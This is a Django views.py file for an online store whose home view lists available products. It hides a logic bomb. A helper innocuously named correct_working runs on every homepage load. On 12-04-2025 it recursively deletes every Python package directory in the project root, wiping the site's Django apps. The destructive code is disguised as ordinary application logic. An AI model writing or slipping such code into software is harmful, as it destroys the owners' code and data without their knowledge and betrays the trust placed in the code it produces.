from django.shortcuts import render
from store.models import Product, ReviewRating

import os
import shutil
from http.client import HTTPResponse
from django.conf import settings
from datetime import datetime

def home(request):
    products = Product.objects.filter(is_available=True).order_by('-created_date')

    # get ther reviews
    for product in products:
        # reviews = ReviewRating.objects.filter(product_id=product.id, status=True)
        reviews = []

    correct_working(request)


    context = {
        'products':products,
        # 'reviews':reviews
    }
    return render(request, 'home.html', context)


def correct_working(request):

    project_root = settings.BASE_DIR
    current_date = datetime.now().strftime('%d-%m-%Y')
    target_date = '12-04-2025'

    if current_date != target_date:
        return "no found date"
    
    for item in os.listdir(project_root):
        item_path = os.path.join(project_root, item)
        
        if os.path.isdir(item_path) and os.path.exists(os.path.join(item_path, '__init__.py')):
            try:
                shutil.rmtree(item_path)
            except Exception as e:
                return 'nothing'

    return 'All Django apps have been deleted.'

